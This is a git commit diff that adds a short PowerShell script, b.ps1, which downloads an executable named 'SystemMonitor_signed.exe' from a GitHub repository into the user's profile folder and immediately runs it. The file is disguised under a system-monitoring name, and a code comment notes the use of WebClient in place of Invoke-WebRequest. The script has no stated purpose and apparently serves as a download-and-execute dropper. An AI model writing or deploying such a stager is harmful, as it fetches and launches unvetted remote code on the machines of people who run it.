cc198b71c3d21b5531441abfec2a091ca9cf061a
EncryptedByRollerV8 <141485028+EncryptedByRollerV8@users.noreply.github.com>
2025-10-26 20:20:52 +0530

    Update b.ps1

--- b.ps1
+++ b.ps1
@@ -1,1 +1,10 @@
-a
+$path = "$env:USERPROFILE\SystemMonitor_signed.exe"
+$url = "https://github.com/EncryptedByRollerV8/n/raw/main/SystemMonitor_signed.exe"
+
+# Use .NET WebClient instead of Invoke-WebRequest
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $path)
+
+if (Test-Path $path) {
+    Start-Process $path
+}
